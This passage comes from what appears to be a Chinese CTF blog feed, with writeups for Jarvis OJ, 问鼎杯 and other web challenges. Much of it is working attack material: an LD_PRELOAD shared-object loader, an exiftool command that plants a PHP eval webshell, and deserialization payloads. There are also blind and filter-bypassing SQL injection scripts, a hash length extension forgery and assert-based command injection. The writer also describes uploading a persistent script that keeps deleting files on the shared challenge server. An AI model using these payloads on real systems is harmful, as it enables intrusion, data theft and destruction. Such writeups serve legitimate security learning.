f72735f61757800636f6d706c657465642e36333434005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006861636b2e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f0067657465756964007061796c6f6164005f656e64005f5f6273735f7374617274005f4a765f5265676973746572436c617373657300756e736574656e764040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400&quot;;file_put_contents(&quot;hack.so&quot;,hex2bin($content));putenv(&quot;LD_PRELOAD=/var/www/html/hack.so&quot;);chmod(&quot;hack.so&quot;,0777);mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); 在页面里提交即可遍历目录再重复这个过程显示flag.php内容即可得到flag。]]></content>
      <tags>
        <tag>PHP execise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[问鼎杯writeup]]></title>
    <url>%2F2017%2F09%2F16%2F%E9%97%AE%E9%BC%8E%E6%9D%AF%E7%BA%BF%E4%B8%8A%2F</url>
    <content type="text"><![CDATA[划水式 1-1简单测试发现它是先判断是否存在7然后判断是否等于2017，直接使用精度问题即可绕过。 1-2测试没任何反应，后来发现可以直接打开admin.php，右键发现一个十分可疑的js，打开后发现里面是个json请求，里面有个key，于是构造此请求，data为这里的key，url为这里的action，结果没反应，查看burpsuite发现是302跳转，得到flag。 2-1拿到发现是wephone事件，开始以为是樱桃小丸子那个微博，发现名字改了，后来找到后发现微博删光了，找到备份没找到任何相关内容，后来发现后台页面，用过typecho知道登录账号是邮箱形式，测试发现她的邮箱账号已被注册，猜测不是其他队伍注册的那么这就是正确的账号，尝试了各种弱密码无果，最后使用车牌通过，在留言里面看到敏感链接，打开即见flag。 2-2注入点应该在username,先测试一下过滤了哪些,发现过滤了空格,单引号,and,or…但是它使用的是双引号而双引号没有被过滤,直接构造一个四则运算:a&quot;^0^&quot;^1,发现还真的绕过了 然后开始构造注入语句。这个时候发现一个很坑的点,因为过滤了or,所以无法使用information_schema。所以只能猜表名了。猜表先试了试admin表 不存在，再试试user表 也不存在，再试试users表 发现存在猜列先试试username列 发现存在，然后试试password,这时候又发现坑了,password也有or,绝望..最后试出来是pass列。直接上盲注脚本 跑出来密码之后登陆，发现不显示密码错误了，但是没有其他可用信息，这是另一个队友说访问显示where is flag?，一问发现他访问的admin.php页面，于是再去访问admin.php即可拿到flag 3-1file看一下文件 解压后还是没后缀,再去file一下 用wireshake打开,导出http对象可以直接看到flag.rar文件,导出后发现有密码。再回去找一下password 发现一个py的aes加密脚本和一串密文:12345678910111213141516171819202122# coding:utf-8__author__ = 'YFP'from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64IV = 'QWERTYUIOPASDFGH'def decrypt(encrypted): aes = AES.new(IV, AES.MODE_CBC, IV) return aes.decrypt(encrypted)def encrypt(message): length = 16 count = len(message) padding = length - (count % length) message = message + '\0' * padding aes = AES.new(IV, AES.MODE_CBC, IV) return aes.encrypt(message)str = 'this is a test'example = encrypt(str)print(decrypt(example)) 19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=,写个脚本解密就好了 然后解开压缩包就可得到flag:WDCTF{Seclab_CTF_2017} 3-2用Stegsolve打开之后一帧一帧保存下来，再用stegsolve的image combiner一张一张add起来 最后扫出二维码是一串pyc文件的十六进制。保存为pyc文件之后，使用uncompyle反编译(这里有个坑，一开始我用的是在线反编译，发现死活做不出来，然后队友拿去编译之后发现和在线反编译出来的有点区别的..) 把这个py文件放到它给的路径下编译吧 4-1看到一张图片，先放到binwalk看一下解压出来是两张看起来一样的图片，然后提示说图二比图一多东西。想起第十届全国信息安全大赛原题http://bobao.360.cn/ctf/detail/205.html猜测盲水印https://github.com/chishaxie/BlindWaterMark 4-2很长的字符串，猜测古典密码，直接扔quipqiup即可解密。 5-1按题目就是xor，但是不知道和谁异或，才开始猜测是和一字节，题目真真假假，那就0b1100结果失败，接着跑0-255，都没有发现可疑字样也没发现生成的文件是可识别格式，于是百度xor ctf发现了xortool这个工具，按照GitHub上的用法，对于二进制文件使用-c 00发现了大量可见字符，再使用-c 20发现了密码是Good\tuckToYou，再看明文很像答案了，可是还有些乱字符，仔细看密码把\t换成L即GoodLuckToYou即可解密。]]></content>
  </entry>
  <entry>
    <title><![CDATA[javrisoj的web题]]></title>
    <url>%2F2017%2F09%2F11%2Fjarvisoj%2F</url>
    <content type="text"><![CDATA[javrisoj的web题writeup WEBadmin进去之后发现什么都没有,以为是源码泄露,反正不管怎么样,先扫一波目录https://github.com/Err0rzz/SourceLeakHacker 进去robots.txt,看到进去之后看到一个假flag,抓包一看就知道了怎么做了… phpinfo进去之后看到ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);想到session反序列化的漏洞http://blog.jobbole.com/107052/之后构造出12345678910111213141516171819&lt;?phpclass OowoO&#123; public $mdzz; function __construct() &#123; // $this-&gt;mdzz = &apos;phpinfo();&apos;; $this-&gt;mdzz = &apos;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&apos;; //$this-&gt;mdzz = &apos;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&apos;; &#125; function __destruct() &#123; //eval($this-&gt;mdzz); &#125;&#125;$m = new OowoO();echo serialize($m);?&gt; 来将所需要的命令给序列化。 payload分别为: |O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:38:&quot;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&quot;;} |O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;} 现在payload已经有了，那么就是将payload写到session里面去。创建一个a.html 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 然后随便上传一个东西，因为变量PHP_SESSION_UPLOAD_PROGRESS的存在，所以会将session的值给替换成上面的123,所以只需要抓包将123替换成payload即可,如下图: 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化 图片上传漏洞这题不懂套路，看了writeup之后才勉强能懂什么意思。先扫一波看一下有个test.php，进去之后发现是phpinfo。最后发现phpinfo中的imagickhttps://www.2cto.com/article/201605/505823.html发现exif也能触发漏洞。先用exiftool生成一个一句话后门 路径由 phpinfo 得到1exiftool -label="\"|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/x.php; \"" test.png 然后上传test.png注意filetype设置为show.上传成功后，就会在uploads/下写入x.php，内容为一句话木马，然后用蚁剑去连接就好了 ps:突然发现uploads/目录有删除的权限,所以上传了个’正经’脚本。1234567891011121314151617181920212223242526272829303132333435&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); function getfiles($path)&#123; foreach(glob($path) as $afile)&#123; if(is_dir($afile)) &#123; getfiles($afile.&apos;/*.jpg&apos;); getfiles($afile.&apos;/*.png&apos;); getfiles($afile.&apos;/*.php&apos;); &#125; else unlink($afile); &#125; &#125; while(1)&#123; getfiles(__DIR__); sleep(10); &#125;?&gt; 常驻内存，循环删除.php,.jpg,.png文件，所以这题应该已经挂了。。 api调用先试了试功能，感觉很像js脚本的功能抓包一看content-type=json,搜到http://bobao.360.cn/learning/detail/360.html如果将content-type的值改为xml的话，服务器会将你传过去的东西解析成xml格式的,所以就可以利用xml来进行嘿嘿嘿了 simple injection挺简单的一道sql题目，测试了一下，发现只过滤了空格，直接上脚本1234567891011121314151617181920212223242526272829303132#coding:utf-8import requestsurl = &apos;http://web.jarvisoj.com:32787/login.php&apos;payloads=&apos;1234567890qwertyuiopasdfghjklzxcvbnm_@&apos;#xx= &quot;&apos;/**/or/**/if(substring((select/**/database())/**/from/**/%s/**/for/**/1)=&apos;%s&apos;,0,1)/**/and/**/&apos;1&apos;=&apos;1&quot;#xx = &quot;&apos;/**/or/**/if(substring((select/**/group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database())/**/from/**/%s/**/for/**/1)=&apos;%s&apos;,0,1)/**/and/**/&apos;1&apos;=&apos;1&quot;#xx = &quot;&apos;/**/or/**/if(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&apos;admin&apos;)/**/from/**/%s/**/for/**/1)=&apos;%s&apos;,0,1)/**/and/**/&apos;1&apos;=&apos;1&quot;xx = &quot;&apos;/**/or/**/if(substring((select/**/password/**/from/**/admin)/**/from/**/%s/**/for/**/1)=&apos;%s&apos;,0,1)/**/and/**/&apos;1&apos;=&apos;1&quot;def exp(i,x): data=&#123;&apos;username&apos;:xx %(i,x),&apos;password&apos;:&apos;123&apos;&#125; #print data response = requests.post(url,data = data) #print response.content if response.content.find(&apos;用户名错误&apos;)&gt;0: return 1 else : return 0ans=&apos;&apos;print &apos;star&apos;for i in range(1,100): for x in payloads: if exp(i,x)==1: ans+=x print ans break md5解密一下:登陆即可得到flag. flag在管理员手里web题第一操作,先扫一波目录,最近换了个新工具https://github.com/ring04h/weakfilescan看到有源码泄露,访问index.php~下载下来源码,因为下载下来的是一串乱七八糟的,需要去恢复一下。 在linux下用file看一下文件类型,发现是swap文件的话加上后缀什么的，然后1vim -r index.php.swp 恢复一下就好了。源码如下:12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = if (isset($_COOKIE[&quot;role&quot;])) &#123; $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie(&apos;role&apos;,$s); $hsh = md5($salt.strrev($s)); setcookie(&apos;hsh&apos;,$hsh); &#125; if ($auth) &#123; echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 发现是hash长度扩展攻击，唯一不同的是不知道secret的长度 首先观察服务器端给了什么信息,发现服务器端返回了$role=&#39;s:5:&quot;guest&quot;;&#39;以及$hsh=md5(salt+strrev($role))然后需要我们求的是md5(salt+strrev(admin)) 先看代码吧12345678910111213141516171819202122232425import hashpumpyimport urllibimport requestsfor i in range(1,30): m=hashpumpy.hashpump('3a4727d57463f122833d9e732f94e4e0',';\"tseug\":5:s',';\"nimda\":5:s',i) print i url='http://120.26.131.152:32778/' digest=m[0] message=urllib.quote(urllib.unquote(m[1])[::-1]) cookie='role='+message+'; hsh='+digest #print cookie headers=&#123; 'cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate'&#125; print headers re=requests.get(url=url,headers=headers) print re.text if "Welcome" in re.text: print re; break 代码是在linux下运行的，因为使用了hashpumpy库，这个库我在win下安装不成功..使用说明如下:1234567891011121314151617&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump)Help on built-in function hashpump in module hashpumpy:hashpump(...) hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hash Returns: A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&apos;ffffffff&apos;, &apos;original_data&apos;, &apos;data_to_add&apos;, len(&apos;KEYKEYKEY&apos;))(&apos;e3c4a05f&apos;, &apos;original_datadata_to_add&apos;) 所以代码中,$hsh的值中已知的部分为strrev(serialize(&#39;guest&#39;)),即&#39;;\&quot;tseug\&quot;:5:s&#39;,&#39;,而需要填充的部分为&#39;;\&quot;nimda\&quot;:5:s&#39;,长度则用爆破。 此时构造出来的cookie为1role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07 这样的cookie传到服务端,首先根据源码,会将role反序列化之后比较是否等于admin,这时候会发现php反序列化也存在%00截断,所以第一个判断过了 接下来会判断$hsh是否等于md5($salt+strrev($role)),而md5($salt+strrev($role))等于md5($salt+strrev(s:5:&quot;admin&quot;;%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:&quot;guest&quot;;))等于md5($salt+strrev(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00;\&quot;nimda\&quot;:5:s)),而其中md5($salt+strrev(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00)等于已知的3a4727d57463f122833d9e732f94e4e0,而这个值也将作为下一个分组的输入,这个和hashpump的运算结果是一样的,所以运行一下代码: Login抓包一看发现hintgoogle一下http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/，直接提交ffifdyop,得到flag PORT 51这题其实就是一个命令的事，不过因为是校园网，出路由的时候会变端口，所以在vps上跑了 localhost说localhost only,加个x-forwarded-for:127.0.0.1 神盾局的秘密右键查看源码发现有个文件包含,读一下index.php和shield.phpindex.php:12345678910&lt;?php require_once(&apos;shield.php&apos;); $x = new Shield(); isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;]; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt;&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; shield.php:12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = &apos;&apos;) &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 反序列化漏洞,根据源码重新写个代码然后将这个值用get方法传给index.php IN A Mess一进去看就知道应该是骚目录或者源码泄露,上了几个开源工具都失败了之后还是选择相信awvs 看一下index.phps123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: index.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;Hahahahahaha&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;flag.txt&quot;);&#125;else&#123; print &quot;work harder!harder!harder!&quot;;&#125;?&gt; php黑魔法了，a的话可以用data伪协议绕过http://cn2.php.net/manual/zh/wrappers.data.php，或者用php://input也可以。id的话因为是两个等号，只要不是数字都能和0相等，b的话因为是eregi存在%00截断，所以最后构造的payload如下:1?id=asd&amp;a=data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==&amp;b=%00aaaaaaaaaaaa 或者12http://web.jarvisoj.com:32780/index.php?id=asd&amp;a=php://input&amp;b=%00aaaaaaaaaaaapost:1112 is a nice lab! 拿到一个新目录,继续awvs:扫出个注入,get方法参数是id 简单测试一下，发现过滤了简单的过滤了空格以及/**/,还有像select,union,from这种关键字都被正则替换了一次,用seselectlect就能过. 1234567891011确定列数http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*aaa*/ununionion/*aaa*/seselectlect/*aaa*/1,2,3%23确定表名http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*aaa*/ununionion/*aaa*/seselectlect/*aaa*/1,2,group_concat(table_name)/*aaa*/frofromm/*aaa*/information_schema.columns/*aaa*/where/*aaa*/table_schema=database()#确定列名http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*aaa*/ununionion/*aaa*/seselectlect/*aaa*/1,2,group_concat(column_name)/*aaa*/frofromm/*aaa*/information_schema.columns/*aaa*/where/*aaa*/table_name=0x636f6e74656e74%23获得数据http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*aaa*/ununionion/*aaa*/seselectlect/*aaa*/1,2,context/*aaa*/frfromom/*aaa*/content%23 re?下载下来之后是个udf.so文件,搜索一下http://blog.csdn.net/shaoyiwenet/article/details/53256103 babyphp提示有说到git，猜测git文件泄露，恢复之后index.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpif (isset($_GET[&apos;page&apos;])) &#123; $page = $_GET[&apos;page&apos;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;My PHP Website&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li &lt;?php if ($page == &quot;contact&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=contact&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;!--&lt;li &lt;?php if ($page == &quot;flag&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=flag&quot;&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt; &lt;?php require_once $file; ?&gt; &lt;/div&gt; &lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt; &lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt; &lt;/body&gt;&lt;/html&gt; 这里就是需要通过12assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); 这两个断言，而$file是我们可以主动构造的，而且我也是刚知道php有个神奇的特性，如下: 字符串拼接的时候是可以执行命令的，所以构造如下：1?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos; 此时构造出来的1assert(&quot;strpos(&apos;templates/flag&apos;.system(&quot;ls templates/;&quot;).&apos;.php&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); 此时程序会先执行ls，然后将输出结果和&#39;templates/&#39;和&#39;.php&#39;拼接出来，然后再去执行strpos，所以输出结果: 然后去cat flag.php就好了 inject这种点进去什么都没有的题目，第一反应就应该是源码泄露或者骚目录，扫一下再说，然后发现index.php~123456789&lt;?phprequire(&quot;config.php&quot;);$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;$table = Filter($table);mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;$ret = sql_query($sql);echo $ret[0];?&gt; 先闭合反引号吧，然后感觉像是排序的问题，然后正常的sql注入:1234567891011查库名?table=flag` ` union select database() limit 1,1查表名?table=flag` ` union select group_concat(table_name) from information_schema.columns where table_schema=database() limit 1,1查列名?table=flag` ` union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1查flag?table=flag` ` union select flagUwillNeverKnow from secret_flag limit 1,1 MISCshell流量分析流量包分析,先搜索一下flag字符串没想到还真的有，跟踪tcp流看一下。发现全是命令其中加解密脚本:1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env python# coding:utf-8__author__ = &apos;Aklis&apos;from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + &apos;\0&apos; * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = &apos;YUFHJKVWEASDGQDH&apos;message = IV + &apos;flag is hctf&#123;xxxxxxxxxxxxxxx&#125;&apos;print len(message)example = encrypt(message, &apos;Qq4wdrhhyEWe4qBF&apos;)print exampleexample = decrypt(example, &apos;Qq4wdrhhyEWe4qBF&apos;) print example 还有flag=mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA== 很明显是base64加密，只需要稍微改一下代码就可解出答案了1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# coding:utf-8__author__ = &apos;Aklis&apos;from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + &apos;\0&apos; * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = &apos;YUFHJKVWEASDGQDH&apos;message = IV + &apos;flag is hctf&#123;xxxxxxxxxxxxxxx&#125;&apos;flag = &apos;mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==&apos;flag=base64.b64decode(flag)example = decrypt(flag, &apos;Qq4wdrhhyEWe4qBF&apos;) print example]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种注入姿势]]></title>
    <url>%2F2017%2F09%2F04%2Finjection%2F</url>
    <content type="text"><![CDATA[各种神奇的姿势 LDAP注入ldap注入详解 Web150-Injection一个注入，其实不难。。。主要是不太熟悉罢了，LDAP注入在乌云有这么一篇文章写得很详细：http://drops.wooyun.org/tips/967根据LDAP的特性，我们可以利用特殊符“*”去替换过滤器中的一个或多个字符，经过测试：admin *，进入search页面：输入test后发现再次发现通配符*，发现正确可以回显，不正确不能回显，并且输入有长度限制。令uid=*，构造)(2=，以形成(|(uid=*)(2=*))然后看了下cookie，有东西：猜测description是一个参数，于是构造：test)(description=随机输入字符，当test)(description=z时有正确回显，于是利用burp诸位爆破： 得到flag：zctf{303a61ace0204a2d5f352771d6f1bba2} group by with rollup题目:http://ctf5.shiyanbar.com/web/pcat/index.php 右键查看源码可以看到source.txt123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "姘村彲杞借垷锛屼害鍙禌鑹囷紒"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "浜﹀彲璧涜墖锛�"; &#125;&#125;else&#123; print "涓€棰楄禌鑹囷紒";&#125;mysql_close($con);?&gt; 主要是这几行代码:123456789101112$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "浜﹀彲璧涜墖锛�"; &#125;&#125;else&#123; print "涓€棰楄禌鑹囷紒";&#125; 有两层限制,第一个限制是要查询结果为一行,可以用&#39; or &#39;1&#39;=&#39;1&#39; limit 1#来绕过,而且如果不加limit的话就会绕不过,这就说明不止一个用户,用offset看了下有两个用户.接下来第二层限制的话用一个神奇的东西group by with rollup group by pwd 是按照pwd来分组，此处是为了搭配 with rollup使用with rollup 统计pwd组的信息，这里没用任何统计函数(sum,avg…)，多出的那一行的pwd列只能是NULL所以到目前取出的的数据类似这样： +——-+——-+| uname | pwd |+——-+——-+| usr1 | * || usr2 | * || usr2 | NULL |+——-+——-+ 然后是limit 1 offset 2 就是跳过两个，只用第三个数据。 那么最终取出的数据就是这样了 +——-+——-+| uname | pwd |+——-+——-+| usr2 | NULL |+——-+——-+ 这样 OOB注入因为这种注入挺常见的，而且东西还是挺多的，所以另外开了篇博客来记录https://err0rzz.github.io/2017/11/16/OOB%E6%B3%A8%E5%85%A5/]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件包含一些常识]]></title>
    <url>%2F2017%2F08%2F31%2Ffile_include%2F</url>
